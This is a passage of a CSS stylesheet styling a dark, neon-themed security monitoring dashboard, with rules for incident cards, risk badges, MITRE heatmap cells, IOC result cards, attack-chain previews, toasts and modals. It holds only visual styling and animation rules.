    background:#050a0f; color:#c9d1d9; font-family:'Inter',system-ui,sans-serif;
    position:relative; overflow:hidden; }

  /* ── Animated hex-grid background ── */
  .rk-root::before {
    content:''; position:absolute; inset:0; pointer-events:none; z-index:0;
    background-image:
      linear-gradient(rgba(0,212,255,0.025) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,212,255,0.025) 1px, transparent 1px);
    background-size: 40px 40px;
    animation: rk-grid-drift 20s linear infinite;
  }
  @keyframes rk-grid-drift {
    0%   { background-position: 0 0; }
    100% { background-position: 40px 40px; }
  }

  /* ── Scan line overlay ── */
  .rk-root::after {
    content:''; position:absolute; inset:0; pointer-events:none; z-index:0;
    background: linear-gradient(transparent 50%, rgba(0,0,0,0.03) 50%);
    background-size: 100% 4px;
    animation: rk-scanlines 8s linear infinite;
    opacity:0.4;
  }
  @keyframes rk-scanlines { 0%{background-position:0 0} 100%{background-position:0 40px} }

  /* All children above pseudo overlays */
  .rk-hdr, .rk-stats-row, .rk-tabs, .rk-body { position:relative; z-index:1; }

  /* ── HEADER ── */
  .rk-hdr {
    display:flex; align-items:center; gap:12px; padding:10px 20px;
    background:rgba(6,12,20,0.95);
    border-bottom:1px solid rgba(0,212,255,0.15);
    flex-shrink:0;
    backdrop-filter: blur(12px);
    box-shadow: 0 1px 0 rgba(0,212,255,0.08), 0 4px 24px rgba(0,0,0,0.6);
  }

  /* ── Logo icon with pulse ring ── */
  .rk-logo-icon {
    width:38px; height:38px; border-radius:10px; flex-shrink:0; position:relative;
    background: linear-gradient(135deg, #ff2d2d 0%, #b91c1c 50%, #7f1d1d 100%);
    display:flex; align-items:center; justify-content:center; font-size:20px;
    box-shadow: 0 0 20px rgba(239,68,68,0.5), 0 0 40px rgba(239,68,68,0.2), inset 0 1px 0 rgba(255,255,255,0.15);
    animation: rk-logo-pulse 3s ease-in-out infinite;
  }
  @keyframes rk-logo-pulse {
    0%,100% { box-shadow: 0 0 20px rgba(239,68,68,0.5), 0 0 40px rgba(239,68,68,0.2); }
    50%     { box-shadow: 0 0 30px rgba(239,68,68,0.8), 0 0 60px rgba(239,68,68,0.35), 0 0 80px rgba(239,68,68,0.1); }
  }
  .rk-logo-icon::after {
    content:''; position:absolute; inset:-4px; border-radius:14px;
    border:1px solid rgba(239,68,68,0.3);
    animation: rk-ring-expand 2s ease-out infinite;
  }
  @keyframes rk-ring-expand {
    0%   { transform:scale(1); opacity:0.6; }
    100% { transform:scale(1.4); opacity:0; }
  }

  .rk-logo-title {
    font-size:16px; font-weight:900; letter-spacing:2px;
    background: linear-gradient(90deg, #ff4444, #ff8800, #00d4ff);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    background-clip: text;
    text-shadow: none;
    filter: drop-shadow(0 0 8px rgba(255,68,68,0.4));
  }
  .rk-logo-sub {
    font-size:9px; color:#4b6b8a; letter-spacing:1.5px; margin-top:1px;
    text-transform:uppercase; font-family:'JetBrains Mono',monospace;
  }

  /* ── WS connection badge ── */
  .rk-ws-badge {
    display:flex; align-items:center; gap:6px; padding:4px 12px;
    border-radius:20px; font-size:11px; font-family:'JetBrains Mono',monospace;
    background:rgba(0,0,0,0.4); border:1px solid rgba(255,255,255,0.06);
    color:#4b6b8a; margin-left:8px;
    transition: all 0.3s;
  }
  .rk-ws-badge.connected {
    border-color:rgba(52,211,153,0.3);
    color:#34d399;
    background:rgba(52,211,153,0.05);
    box-shadow: 0 0 12px rgba(52,211,153,0.15);
  }

  /* ── Risk badge ── */
  #rk-risk-badge {
    padding:5px 14px; border-radius:20px; font-size:11px; font-weight:700;
    font-family:'JetBrains Mono',monospace; letter-spacing:0.5px;
    background:rgba(107,114,128,0.1); color:#6b7280;
    border:1px solid rgba(107,114,128,0.2);
    transition: all 0.4s ease;
  }
  #rk-risk-badge.risk-critical {
    background:rgba(239,68,68,0.12); color:#ef4444; border-color:rgba(239,68,68,0.4);
    box-shadow: 0 0 16px rgba(239,68,68,0.2), inset 0 0 16px rgba(239,68,68,0.05);
    animation: rk-risk-flash 1.5s ease-in-out infinite;
  }
  @keyframes rk-risk-flash {
    0%,100% { box-shadow: 0 0 16px rgba(239,68,68,0.2); }
    50%     { box-shadow: 0 0 28px rgba(239,68,68,0.5), 0 0 50px rgba(239,68,68,0.15); }
  }
  #rk-risk-badge.risk-high   { background:rgba(249,115,22,0.12); color:#f97316; border-color:rgba(249,115,22,0.4); }
  #rk-risk-badge.risk-medium { background:rgba(234,179,8,0.12); color:#eab308; border-color:rgba(234,179,8,0.4); }
  #rk-risk-badge.risk-low    { background:rgba(34,197,94,0.12); color:#22c55e; border-color:rgba(34,197,94,0.4); }

  /* ── Header action buttons ── */
  .rk-hdr-btn {
    padding:6px 14px; border-radius:7px; font-size:11px; font-weight:700;
    cursor:pointer; border:none; transition:all 0.2s; letter-spacing:0.3px;
    position:relative; overflow:hidden;
  }
  .rk-hdr-btn::before {
    content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,0.1),transparent);
    opacity:0; transition:opacity 0.2s;
  }
  .rk-hdr-btn:hover::before { opacity:1; }
  .rk-hdr-btn-ghost {
    background:rgba(255,255,255,0.04); color:#8b949e;
    border:1px solid rgba(255,255,255,0.08);
  }
  .rk-hdr-btn-ghost:hover { color:#e6edf3; border-color:rgba(0,212,255,0.3); background:rgba(0,212,255,0.05); }
  .rk-hdr-btn-demo {
    background: linear-gradient(135deg, #dc2626, #991b1b);
    color:#fff;
    box-shadow: 0 0 16px rgba(220,38,38,0.3);
  }
  .rk-hdr-btn-demo:hover { box-shadow: 0 0 24px rgba(220,38,38,0.5); transform:translateY(-1px); }
  .rk-hdr-btn-demo:active { transform:translateY(0); }

  /* ── STATS ROW ── */
  .rk-stats-row {
    display:grid; grid-template-columns:repeat(6,1fr); gap:1px;
    background:rgba(0,212,255,0.06);
    border-bottom:1px solid rgba(0,212,255,0.12); flex-shrink:0;
  }
  .rk-stat {
    padding:12px 16px; background:rgba(6,12,20,0.96);
    position:relative; overflow:hidden; cursor:default;
    transition: background 0.3s;
  }
  .rk-stat::before {
    content:''; position:absolute; bottom:0; left:0; right:0; height:2px;
    background:linear-gradient(90deg, transparent, var(--rk-stat-color, #60a5fa), transparent);
    transform:scaleX(0); transform-origin:center;
    transition:transform 0.4s ease;
  }
  .rk-stat:hover { background:rgba(0,212,255,0.03); }
  .rk-stat:hover::before { transform:scaleX(1); }
  .rk-stat-val {
    font-size:24px; font-weight:800; font-family:'JetBrains Mono',monospace;
    line-height:1; transition:all 0.5s;
    filter: drop-shadow(0 0 6px currentColor);
  }
  .rk-stat-lbl {
    font-size:9px; color:#3d5a6b; margin-top:3px;
    text-transform:uppercase; letter-spacing:1px; font-weight:600;
  }
  .rk-stat-trend {
    position:absolute; top:10px; right:12px; font-size:9px;
    font-family:'JetBrains Mono',monospace;
  }

  /* Count-up animation */
  @keyframes rk-countup { from { opacity:0; transform:translateY(6px); } to { opacity:1; transform:translateY(0); } }
  .rk-stat-val.updated { animation: rk-countup 0.4s ease-out; }

  /* ── TABS ── */
  .rk-tabs {
    display:flex; background:rgba(6,12,20,0.98);
    border-bottom:1px solid rgba(0,212,255,0.1);
    flex-shrink:0; overflow-x:auto; scrollbar-width:none;
  }
  .rk-tabs::-webkit-scrollbar { display:none; }
  .rk-tab {
    padding:10px 15px; font-size:11px; font-weight:600; cursor:pointer;
    background:none; color:#3d5a6b; border:none; border-bottom:2px solid transparent;
    white-space:nowrap; transition:all 0.2s; letter-spacing:0.3px;
    position:relative;
  }
  .rk-tab:hover { color:#8bb5cc; background:rgba(0,212,255,0.03); }
  .rk-tab.active {
    color:#00d4ff; border-bottom-color:#00d4ff;
    text-shadow: 0 0 12px rgba(0,212,255,0.6);
  }
  .rk-tab.active::after {
    content:''; position:absolute; bottom:-1px; left:0; right:0; height:2px;
    background:linear-gradient(90deg,transparent,#00d4ff,transparent);
    filter:blur(2px);
  }
  /* Alert dot on tab */
  .rk-tab-alert {
    display:inline-block; width:5px; height:5px; border-radius:50%;
    background:#ef4444; margin-left:4px; vertical-align:middle;
    box-shadow:0 0 6px rgba(239,68,68,0.8);
    animation:rk-pulse 1.5s ease-in-out infinite;
  }

  /* ── BODY ── */
  .rk-body { flex:1; overflow:auto; scrollbar-width:thin; scrollbar-color:#1a2535 transparent; }
  .rk-body::-webkit-scrollbar { width:5px; }
  .rk-body::-webkit-scrollbar-track { background:transparent; }
  .rk-body::-webkit-scrollbar-thumb { background:#1a2535; border-radius:3px; }

  /* ── PANEL ── */
  .rk-panel { padding:20px; animation:rk-panel-in 0.25s ease-out; }
  @keyframes rk-panel-in { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }

  /* ── CARDS ── */
  .rk-card {
    background:rgba(10,18,28,0.9);
    border:1px solid rgba(0,212,255,0.1);
    border-radius:12px;
    backdrop-filter:blur(4px);
    transition: border-color 0.3s, box-shadow 0.3s;
    position:relative;
  }
  .rk-card:hover {
    border-color:rgba(0,212,255,0.2);
    box-shadow:0 4px 24px rgba(0,0,0,0.4), 0 0 0 1px rgba(0,212,255,0.05);
  }
  /* Corner accent on cards */
  .rk-card::before {
    content:''; position:absolute; top:0; left:0; width:40px; height:2px;
    background:linear-gradient(90deg,#00d4ff,transparent);
    border-radius:12px 0 0 0; pointer-events:none;
  }
  .rk-card-hdr {
    padding:14px 18px; border-bottom:1px solid rgba(0,212,255,0.08);
    display:flex; align-items:center; justify-content:space-between;
  }
  .rk-card-title {
    font-size:12px; font-weight:700; color:#7aa5be; text-transform:uppercase;
    letter-spacing:0.8px;
  }

  /* ── INCIDENT CARD (critical-level) ── */
  .rk-inc-card {
    background:rgba(8,14,24,0.95);
    border-radius:14px; overflow:hidden;
    position:relative;
    transition:transform 0.2s, box-shadow 0.3s;
    animation: rk-card-appear 0.35s ease-out forwards;
  }
  @keyframes rk-card-appear {
    from { opacity:0; transform:translateY(12px); }
    to   { opacity:1; transform:translateY(0); }
  }
  .rk-inc-card:hover { transform:translateY(-2px); }
  .rk-inc-card.sev-critical {
    border:1px solid rgba(239,68,68,0.3);
    box-shadow: 0 0 30px rgba(239,68,68,0.08), 0 4px 20px rgba(0,0,0,0.5);
  }
  .rk-inc-card.sev-critical::before {
    content:''; position:absolute; top:0; left:0; right:0; height:2px;
    background:linear-gradient(90deg,#ef4444,#f97316,#ef4444);
    background-size:200% 100%;
    animation: rk-border-flow 2s linear infinite;
  }
  @keyframes rk-border-flow { 0%{background-position:0 0} 100%{background-position:200% 0} }
  .rk-inc-card.sev-high {
    border:1px solid rgba(249,115,22,0.25);
    box-shadow:0 0 20px rgba(249,115,22,0.07);
  }
  .rk-inc-card.sev-medium {
    border:1px solid rgba(234,179,8,0.2);
    box-shadow:0 0 16px rgba(234,179,8,0.05);
  }
  .rk-inc-card.sev-low, .rk-inc-card.sev-informational {
    border:1px solid rgba(0,212,255,0.12);
  }

  /* ── BUTTONS ── */
  .rk-btn {
    padding:7px 16px; border-radius:7px; font-size:12px; font-weight:700;
    cursor:pointer; border:none; transition:all 0.2s; letter-spacing:0.3px;
    position:relative; overflow:hidden;
  }
  .rk-btn::after {
    content:''; position:absolute; top:50%; left:50%; width:0; height:0;
    background:rgba(255,255,255,0.2); border-radius:50%;
    transform:translate(-50%,-50%); transition:width 0.4s, height 0.4s, opacity 0.4s;
    opacity:0;
  }
  .rk-btn:active::after { width:200px; height:200px; opacity:0; }
  .rk-btn-primary {
    background:linear-gradient(135deg,#1a3fa0,#1e5ed4);
    color:#fff; box-shadow:0 0 16px rgba(30,94,212,0.3), inset 0 1px 0 rgba(255,255,255,0.1);
  }
  .rk-btn-primary:hover { box-shadow:0 0 24px rgba(30,94,212,0.5); transform:translateY(-1px); }
  .rk-btn-red {
    background:linear-gradient(135deg,#dc2626,#991b1b);
    color:#fff; box-shadow:0 0 16px rgba(220,38,38,0.3), inset 0 1px 0 rgba(255,255,255,0.1);
  }
  .rk-btn-red:hover { box-shadow:0 0 28px rgba(220,38,38,0.5); transform:translateY(-1px); }
  .rk-btn-purple {
    background:linear-gradient(135deg,#6d28d9,#7c3aed);
    color:#fff; box-shadow:0 0 16px rgba(124,58,237,0.3), inset 0 1px 0 rgba(255,255,255,0.1);
  }
  .rk-btn-purple:hover { box-shadow:0 0 24px rgba(124,58,237,0.5); transform:translateY(-1px); }
  .rk-btn-ghost {
    background:rgba(255,255,255,0.04); color:#6b8fa3;
    border:1px solid rgba(255,255,255,0.08);
  }
  .rk-btn-ghost:hover { color:#b0cad8; border-color:rgba(0,212,255,0.3); background:rgba(0,212,255,0.06); }
  .rk-btn-cyan {
    background:linear-gradient(135deg,#0891b2,#0e7490);
    color:#fff; box-shadow:0 0 16px rgba(8,145,178,0.3);
  }
  .rk-btn-cyan:hover { box-shadow:0 0 24px rgba(8,145,178,0.5); transform:translateY(-1px); }

  /* ── INPUTS ── */
  .rk-input {
    background:rgba(0,0,0,0.4); border:1px solid rgba(255,255,255,0.08);
    border-radius:8px; padding:9px 14px; color:#c9d1d9;
    font-size:13px; outline:none; width:100%; box-sizing:border-box;
    transition:all 0.2s; font-family:'Inter',system-ui,sans-serif;
  }
  .rk-input:focus {
    border-color:rgba(0,212,255,0.5);
    background:rgba(0,212,255,0.03);
    box-shadow: 0 0 0 3px rgba(0,212,255,0.08), 0 0 20px rgba(0,212,255,0.1);
  }
  .rk-input::placeholder { color:#2d4a5a; }

  /* ── BADGES & PILLS ── */
  .rk-badge {
    display:inline-flex; align-items:center; padding:2px 8px;
    border-radius:10px; font-size:10px; font-weight:700; text-transform:uppercase;
    letter-spacing:0.5px;
  }
  .rk-sev-critical { background:rgba(239,68,68,0.15); color:#ef4444; box-shadow:0 0 8px rgba(239,68,68,0.2); }
  .rk-sev-high     { background:rgba(249,115,22,0.15); color:#f97316; }
  .rk-sev-medium   { background:rgba(234,179,8,0.12); color:#eab308; }
  .rk-sev-low      { background:rgba(34,197,94,0.1); color:#22c55e; }
  .rk-sev-info     { background:rgba(107,114,128,0.15); color:#6b7280; }

  /* ── CHIPS ── */
  .rk-chip {
    padding:3px 10px; border-radius:12px; font-size:11px; cursor:pointer;
    background:rgba(255,255,255,0.04); color:#4b6b8a;
    border:1px solid rgba(255,255,255,0.07); white-space:nowrap;
    transition:all 0.2s;
  }
  .rk-chip:hover {
    color:#00d4ff; border-color:rgba(0,212,255,0.4);
    background:rgba(0,212,255,0.06);
    box-shadow:0 0 10px rgba(0,212,255,0.15);
  }

  /* ── SELECT ── */
  .rk-select {
    background:rgba(0,0,0,0.4); color:#8bb5cc;
    border:1px solid rgba(255,255,255,0.08); border-radius:7px;
    padding:6px 10px; font-size:12px; outline:none; cursor:pointer;
    transition:border-color 0.2s;
  }
  .rk-select:focus { border-color:rgba(0,212,255,0.4); }

  /* ── DETECTION ROWS ── */
  .rk-det-row {
    display:flex; align-items:flex-start; gap:12px; padding:11px 16px;
    border-bottom:1px solid rgba(255,255,255,0.04); cursor:pointer;
    transition:all 0.15s; position:relative; overflow:hidden;
  }
  .rk-det-row::before {
    content:''; position:absolute; left:0; top:0; bottom:0; width:2px;
    background:transparent; transition:background 0.2s;
  }
  .rk-det-row:hover { background:rgba(0,212,255,0.03); }
  .rk-det-row:hover::before { background:#00d4ff; }
  .rk-det-row:last-child { border-bottom:none; }

  /* ── TIMELINE ── */
  .rk-timeline-item {
    display:flex; gap:16px; padding:10px 16px;
    border-left:1px solid rgba(0,212,255,0.15); margin-left:20px;
    position:relative;
  }
  .rk-tl-dot {
    width:10px; height:10px; border-radius:50%; margin-top:4px;
    flex-shrink:0; margin-left:-21px;
    box-shadow:0 0 8px currentColor;
  }

  /* ── GRID LAYOUTS ── */
  .rk-grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
  .rk-grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; }

  /* ── SPINNER ── */
  .rk-spinner {
    width:32px; height:32px; border-radius:50%;
    border:2px solid rgba(0,212,255,0.1); border-top-color:#00d4ff;
    animation:rk-spin 0.8s linear infinite; margin:0 auto;
    box-shadow:0 0 16px rgba(0,212,255,0.2);
  }
  @keyframes rk-spin { to { transform:rotate(360deg); } }

  /* ── CODE / MONO ── */
  .rk-code  { font-family:'JetBrains Mono','Fira Code',monospace; font-size:11px; color:#a5c8d8; }

  /* ── TAGS ── */
  .rk-tag {
    display:inline-block; padding:2px 7px; border-radius:4px;
    font-size:10px; background:rgba(255,255,255,0.05);
    color:#4b6b8a; border:1px solid rgba(255,255,255,0.07);
    margin:2px 1px;
  }

  /* ── ENTITY BUTTONS ── */
  .rk-entity-btn {
    padding:4px 10px; border-radius:6px; font-size:11px; cursor:pointer;
    background:rgba(0,212,255,0.06); color:#00d4ff;
    border:1px solid rgba(0,212,255,0.2); transition:all 0.2s;
    font-weight:600;
  }
  .rk-entity-btn:hover {
    background:rgba(0,212,255,0.12);
    box-shadow:0 0 12px rgba(0,212,255,0.2);
  }

  /* ── CHAIN STAGE ELEMENTS ── */
  .rk-chain-stage { display:flex; align-items:center; gap:0; }
  .rk-chain-step {
    padding:8px 14px; border-radius:7px; font-size:11px; font-weight:700;
    background:rgba(10,18,28,0.9); border:1px solid rgba(0,212,255,0.2);
    color:#a5c8d8; white-space:nowrap;
    transition:all 0.2s;
  }
  .rk-chain-step:hover { border-color:rgba(0,212,255,0.5); box-shadow:0 0 12px rgba(0,212,255,0.15); }
  .rk-chain-arrow { color:#1a3a4a; font-size:16px; padding:0 4px; }

  /* ── MITRE CELL ── */
  .rk-mitre-cell {
    padding:6px 4px; border-radius:5px; font-size:9px; font-weight:700;
    text-align:center; cursor:pointer; transition:all 0.2s;
    overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
  }
  .rk-mitre-cell:hover { transform:scale(1.05); filter:brightness(1.3); }

  /* ── UPLOAD ZONE ── */
  .rk-upload-zone {
    border:2px dashed rgba(0,212,255,0.2); border-radius:12px; padding:40px;
    text-align:center; cursor:pointer; transition:all 0.3s;
    background:rgba(0,212,255,0.02);
    position:relative; overflow:hidden;
  }
  .rk-upload-zone::before {
    content:''; position:absolute; inset:-40px; background:
      radial-gradient(circle at 50% 50%, rgba(0,212,255,0.05), transparent 70%);
    animation:rk-upload-glow 3s ease-in-out infinite;
  }
  @keyframes rk-upload-glow { 0%,100%{opacity:0.5} 50%{opacity:1} }
  .rk-upload-zone:hover, .rk-upload-zone.drag-over {
    border-color:rgba(0,212,255,0.6);
    background:rgba(0,212,255,0.06);
    box-shadow:0 0 30px rgba(0,212,255,0.1), inset 0 0 30px rgba(0,212,255,0.05);
  }

  /* ── PROGRESS BAR ── */
  .rk-progress { height:4px; border-radius:2px; background:rgba(255,255,255,0.06); overflow:hidden; }
  .rk-progress-bar {
    height:100%; border-radius:2px;
    background:linear-gradient(90deg, #0891b2, #00d4ff, #a78bfa);
    background-size:200% 100%;
    transition:width 0.4s ease;
    animation:rk-bar-shimmer 2s linear infinite;
    box-shadow:0 0 8px rgba(0,212,255,0.4);
  }
  @keyframes rk-bar-shimmer { 0%{background-position:200% 0} 100%{background-position:0 0} }

  /* ── TABLE ── */
  .rk-table  { width:100%; border-collapse:collapse; font-size:12px; }
  .rk-table th {
    padding:9px 14px; background:rgba(0,212,255,0.04); color:#3d6680;
    text-align:left; font-weight:700; font-size:10px;
    text-transform:uppercase; letter-spacing:1px;
    border-bottom:1px solid rgba(0,212,255,0.1);
  }
  .rk-table td { padding:9px 14px; border-bottom:1px solid rgba(255,255,255,0.04); color:#8bb5cc; }
  .rk-table tr:last-child td { border-bottom:none; }
  .rk-table tr:hover td { background:rgba(0,212,255,0.03); color:#c9d1d9; }

  /* ── MODAL ── */
  .rk-modal-overlay {
    position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:5000;
    display:flex; align-items:center; justify-content:center;
    backdrop-filter:blur(6px);
    animation:rk-overlay-in 0.2s ease;
  }
  @keyframes rk-overlay-in { from{opacity:0} to{opacity:1} }
  .rk-modal {
    background:rgba(8,14,24,0.98); border:1px solid rgba(0,212,255,0.2);
    border-radius:16px; max-width:820px; width:90%; max-height:82vh;
    overflow:hidden; display:flex; flex-direction:column;
    box-shadow:0 0 60px rgba(0,212,255,0.1), 0 24px 80px rgba(0,0,0,0.8);
    animation:rk-modal-in 0.25s cubic-bezier(0.34,1.56,0.64,1);
  }
  @keyframes rk-modal-in { from{transform:scale(0.9) translateY(-20px);opacity:0} to{transform:scale(1) translateY(0);opacity:1} }

  /* ── TOAST NOTIFICATIONS ── */
  .rk-toast {
    padding:10px 16px; border-radius:10px; font-size:12px; font-weight:600;
    max-width:380px; backdrop-filter:blur(12px); border:1px solid;
    display:flex; align-items:center; gap:10px;
    animation:rk-toast-in 0.3s cubic-bezier(0.34,1.56,0.64,1);
    box-shadow:0 8px 32px rgba(0,0,0,0.5);
  }
  @keyframes rk-toast-in { from{transform:translateX(100%);opacity:0} to{transform:translateX(0);opacity:1} }
  .rk-toast.fade-out { animation:rk-toast-out 0.3s ease forwards; }
  @keyframes rk-toast-out { to{transform:translateX(120%);opacity:0} }
  .rk-toast-success { background:rgba(5,46,22,0.95); color:#34d399; border-color:rgba(52,211,153,0.3); }
  .rk-toast-error   { background:rgba(60,5,5,0.95);  color:#ef4444; border-color:rgba(239,68,68,0.3); }
  .rk-toast-info    { background:rgba(5,20,46,0.95);  color:#60a5fa; border-color:rgba(96,165,250,0.3); }
  .rk-toast-warning { background:rgba(46,28,5,0.95);  color:#f59e0b; border-color:rgba(245,158,11,0.3); }

  /* ── LIVE DOT ── */
  @keyframes rk-pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.5;transform:scale(0.8)} }
  .rk-live-dot {
    width:8px; height:8px; border-radius:50%; display:inline-block;
    background:#34d399; animation:rk-pulse 2s ease-in-out infinite;
    box-shadow:0 0 8px rgba(52,211,153,0.8);
  }

  /* ── THREAT PULSE RING ── */
  .rk-threat-ring {
    position:relative; display:inline-block;
  }
  .rk-threat-ring::after {
    content:''; position:absolute; inset:-6px; border-radius:50%;
    border:1px solid; opacity:0;
    animation:rk-threat-pulse 2s ease-out infinite;
  }
  @keyframes rk-threat-pulse {
    0%   { transform:scale(0.8); opacity:0.8; }
    100% { transform:scale(2); opacity:0; }
  }

  /* ── RISK GAUGE GLOW ── */
  #rk-risk-arc { filter:drop-shadow(0 0 8px currentColor); }

  /* ── ENGINE CARD ── */
  .rk-engine-card {
    padding:16px; border-radius:10px;
    background:rgba(8,14,24,0.9); border:1px solid rgba(0,212,255,0.08);
    position:relative; overflow:hidden; transition:all 0.3s;
  }
  .rk-engine-card:hover { border-color:rgba(0,212,255,0.2); transform:translateY(-2px); }
  .rk-engine-card::after {
    content:''; position:absolute; bottom:0; left:0; right:0; height:1px;
    background:linear-gradient(90deg,transparent,rgba(0,212,255,0.3),transparent);
  }
  .rk-engine-label {
    font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:1px;
    margin-bottom:8px;
  }
  .rk-engine-val {
    font-size:24px; font-weight:800; font-family:'JetBrains Mono',monospace;
    color:#c9d1d9; line-height:1;
    filter:drop-shadow(0 0 6px rgba(0,212,255,0.3));
  }
  .rk-engine-sub { font-size:9px; color:#2d4a5a; margin-top:4px; text-transform:uppercase; letter-spacing:0.8px; }

  /* ── SCENARIO BUTTONS ── */
  .rk-scenario-btn {
    padding:14px 16px; border-radius:10px; font-size:12px; font-weight:600;
    cursor:pointer; background:rgba(10,18,28,0.9);
    border:1px solid rgba(0,212,255,0.1); color:#8bb5cc;
    text-align:left; transition:all 0.25s; min-width:180px; position:relative;
    overflow:hidden;
  }
  .rk-scenario-btn::before {
    content:''; position:absolute; inset:0;
    background:linear-gradient(135deg,rgba(0,212,255,0.05),transparent);
    opacity:0; transition:opacity 0.3s;
  }
  .rk-scenario-btn:hover { border-color:rgba(0,212,255,0.4); color:#c9d1d9; transform:translateY(-2px); }
  .rk-scenario-btn:hover::before { opacity:1; }

  /* ── PHASE TIMELINE ── */
  .rk-phase-row {
    display:flex; align-items:flex-start; gap:10px; padding:8px 0;
    border-bottom:1px solid rgba(255,255,255,0.04);
    animation:rk-row-in 0.2s ease-out;
  }
  @keyframes rk-row-in { from{opacity:0;transform:translateX(-6px)} to{opacity:1;transform:translateX(0)} }

  /* ── MITRE HEATMAP ── */
  .rk-mitre-col-header {
    font-size:9px; font-weight:700; color:#2d4a5a; text-transform:uppercase;
    letter-spacing:0.5px; padding:6px 4px; text-align:center;
  }

  /* ── OVERVIEW ENGINE STATUS ── */
  .rk-overview-empty {
    padding:60px; text-align:center; color:#1a3040;
    font-size:13px; font-family:'JetBrains Mono',monospace;
  }
  .rk-overview-empty-icon { font-size:40px; margin-bottom:12px; filter:grayscale(0.5); }

  /* ── HUNT CHIPS ── */
  .rk-hunt-chip {
    padding:4px 12px; border-radius:12px; font-size:11px; cursor:pointer;
    background:rgba(0,0,0,0.4); color:#4b6b8a;
    border:1px solid rgba(255,255,255,0.06); white-space:nowrap;
    transition:all 0.2s; font-family:'JetBrains Mono',monospace;
  }
  .rk-hunt-chip:hover {
    color:#00d4ff; border-color:rgba(0,212,255,0.4);
    background:rgba(0,212,255,0.08); box-shadow:0 0 12px rgba(0,212,255,0.2);
  }

  /* ── RISK COLOR HELPER CLASSES ── */
  .rk-risk-critical { color:#ef4444 !important; filter:drop-shadow(0 0 6px rgba(239,68,68,0.5)); }
  .rk-risk-high     { color:#f97316 !important; filter:drop-shadow(0 0 5px rgba(249,115,22,0.4)); }
  .rk-risk-medium   { color:#eab308 !important; }
  .rk-risk-low      { color:#22c55e !important; }
  .rk-risk-clean    { color:#4b6b8a !important; }

  /* ── CYBER SECTION HEADERS ── */
  .rk-section-hdr {
    display:flex; align-items:center; gap:8px; margin-bottom:14px;
  }
  .rk-section-hdr-line {
    flex:1; height:1px;
    background:linear-gradient(90deg,rgba(0,212,255,0.3),transparent);
  }
  .rk-section-hdr-label {
    font-size:10px; font-weight:700; color:#2d6080; text-transform:uppercase;
    letter-spacing:1.5px; white-space:nowrap;
  }

  /* ── SCROLLBAR (body) ── */
  .rk-inc-list { scrollbar-width:thin; scrollbar-color:#0d1e2d transparent; }
  .rk-inc-list::-webkit-scrollbar { width:4px; }
  .rk-inc-list::-webkit-scrollbar-thumb { background:#0d1e2d; border-radius:4px; }

  /* ── CONNECTING LINE for chain flow ── */
  .rk-chain-connector { color:#0d2535; font-size:18px; padding:0 2px; }

  /* ── INFERRED STAGE BADGE ── */
  .rk-inferred-badge {
    font-size:8px; padding:1px 5px; border-radius:4px; font-style:italic;
    background:rgba(107,114,128,0.15); color:#4b6b8a; border:1px solid rgba(107,114,128,0.2);
  }

  /* ── TACTIC PILL ── */
  .rk-tactic-pill {
    font-size:9px; padding:2px 8px; border-radius:6px;
    font-weight:700; letter-spacing:0.3px;
    transition:all 0.2s;
  }
  .rk-tactic-pill:hover { transform:scale(1.05); filter:brightness(1.2); }

  /* ── PHASE SEQUENCE ARROW ── */
  .rk-phase-arrow { color:#0d2535; font-size:10px; }

  /* ── STAT CARDS (overview) ── */
  .rk-ov-stat {
    padding:12px 16px; border-radius:10px; text-align:center;
    background:rgba(8,14,24,0.9); border:1px solid rgba(0,212,255,0.08);
    transition:all 0.3s;
  }
  .rk-ov-stat:hover { border-color:rgba(0,212,255,0.25); transform:translateY(-2px); }

  /* ── GRID BG for MITRE ── */
  .rk-mitre-grid { display:grid; gap:2px; }

  /* ── RISK EVOLUTION BAR CONTAINER ── */
  .rk-risk-evo {
    padding:10px 16px; background:rgba(5,10,18,0.7);
    border-top:1px solid rgba(0,212,255,0.06);
  }
  .rk-risk-evo-title {
    font-size:9px; color:#1a3040; text-transform:uppercase;
    letter-spacing:1px; margin-bottom:6px; font-weight:700;
  }

  /* ── RULE CARD ── */
  .rk-rule-row {
    padding:12px 16px; border-bottom:1px solid rgba(255,255,255,0.04);
    transition:background 0.15s; cursor:default;
  }
  .rk-rule-row:hover { background:rgba(0,212,255,0.02); }
  .rk-rule-row:last-child { border-bottom:none; }

  /* ── ANOMALY ROW ── */
  .rk-anom-card {
    padding:14px 18px; border-radius:10px;
    background:rgba(8,14,24,0.9); border:1px solid rgba(245,158,11,0.15);
    transition:all 0.2s; animation:rk-card-appear 0.3s ease-out;
  }
  .rk-anom-card:hover { border-color:rgba(245,158,11,0.35); box-shadow:0 0 16px rgba(245,158,11,0.08); }

  /* ── IOC RESULT CARD ── */
  .rk-ioc-result-card {
    padding:20px; border-radius:12px;
    background:rgba(8,14,24,0.9); border:1px solid rgba(0,212,255,0.12);
    animation:rk-card-appear 0.3s ease-out;
  }

  /* ── INVESTIGATION CARD ── */
  .rk-inv-section {
    padding:14px 18px; border-radius:10px; margin-bottom:12px;
    background:rgba(8,14,24,0.9); border:1px solid rgba(0,212,255,0.08);
  }

  /* ── GENERATED RULE ── */
  .rk-gen-rule {
    padding:16px; border-radius:10px;
    background:rgba(5,25,10,0.9); border:1px solid rgba(52,211,153,0.2);
    font-family:'JetBrains Mono',monospace; font-size:11px; color:#a5d6b0;
    white-space:pre-wrap; line-height:1.6;
    box-shadow:0 0 20px rgba(52,211,153,0.05);
  }

  /* ── INGEST SUMMARY ── */
  .rk-ingest-summary {
    padding:18px 20px; border-radius:12px;
    background:rgba(8,14,24,0.95); border:1px solid rgba(52,211,153,0.15);
    animation:rk-card-appear 0.4s ease-out;
  }

  /* ── CHAIN PREVIEW ── */
  .rk-chain-preview {
    padding:14px 18px; border-radius:10px;
    background:rgba(6,12,20,0.9); border:1px solid rgba(167,139,250,0.15);
    transition:all 0.2s; animation:rk-card-appear 0.3s ease-out;
  }
  .rk-chain-preview:hover { border-color:rgba(167,139,250,0.35); box-shadow:0 0 20px rgba(167,139,250,0.08); }

